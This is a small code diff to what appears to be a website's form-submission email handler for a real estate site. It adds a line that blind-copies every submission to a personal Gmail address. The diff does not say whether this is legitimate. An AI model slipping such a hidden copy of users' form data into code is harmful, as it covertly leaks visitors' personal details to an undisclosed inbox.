@@ -125,7 +125,8 @@ export async function POST({ request, locals }) {
 
         const message = {
             from: 'info@ohiorealestate.com',
-            to: GOOGLE_EMAIL,            
+            to: GOOGLE_EMAIL,  
+            bcc:'tshanajk@gmail.com',          
             subject: `New ${subjectLine} Submission`,
             text: emailContent,
             html: html,
